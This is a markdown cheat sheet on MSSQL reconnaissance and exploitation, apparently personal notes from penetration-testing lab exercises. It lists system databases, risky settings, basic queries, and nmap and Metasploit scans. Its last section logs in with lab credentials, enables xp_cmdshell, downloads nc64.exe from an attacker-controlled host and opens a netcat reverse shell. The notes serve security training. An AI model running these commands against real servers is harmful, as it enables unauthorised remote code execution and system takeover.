# MSSQL
## Default system databases
| Default System Database | Description |
|-------------------------|-------------|
| master                  | Tracks all system information for an SQL server instance. |
| model                   | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database. |
| msdb                    | The SQL Server Agent uses this database to schedule jobs & alerts. |
| tempdb                  | Stores temporary objects such as temporary tables and stored procedures. |
| resource                | Read-only database containing system objects included with SQL server. |

## Confirugation
### Auth
Can be set to use Active Directory or SQL Server Authentication.

Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment.

### Dangerous Settings
- there are countless ways here are some thinks we can look inside
- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of named pipes
- Weak & default sa credentials. Admins may forget to disable this account

## Commands
| Task                          | SQL Command                                               |
|-------------------------------|-----------------------------------------------------------|
| Show all databases            | `SELECT name FROM sys.databases;`                         |
| Show all tables in a database | `USE database_name;` followed by `SELECT * FROM information_schema.tables;` |
| Show all users                | `SELECT name FROM sys.sysusers;`                          |
| Show table columns            | `USE database_name;` followed by `SELECT * FROM information_schema.columns WHERE table_name = 'table_name';` |
| Show current user             | `SELECT SYSTEM_USER;`                                     |
| Show database version         | `SELECT @@VERSION;`                                       |
| Show privileges               | `SELECT * FROM fn_my_permissions(NULL, 'DATABASE');`      |
| Show server properties        | `EXEC sp_configure;`                                      |


## Footprinting

### Nmap
```shell
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.221.151
```

### MSQL PING in Metasploit
```shell
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
rhosts => 10.129.201.248


msf6 auxiliary(scanner/mssql/mssql_ping) > run

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


### Clients
### find installed mssqlclients
```shell
locate mssqlclient
```
#### Impacket mssqlclient.py
```shell
python3 mssqlclient.py backdoor@10.129.221.151 -windows-auth
```
```sh
cd impacket/examples/
# this will give an mssql login
python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.101.236 -windows-auth 
SELECT is_srvrolemember('sysadmin'); # returns if we are sysadmin or not
# this cna be used to get cmdshell by enabling xp_cmdshell
EXEC xp_cmdshell 'net user';  #delivers error so not activated

#This is to activate it: 
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; #- Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'net user'; #no error anymore

#download reverse shell script: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
sudo python3 -m http.server 8001
sudo nc -lvnp 443

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9:8001/nc64.exe -outfile nc64.exe" # reverse shell exe to target
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443" #execute reverse shell with netcat connection
```
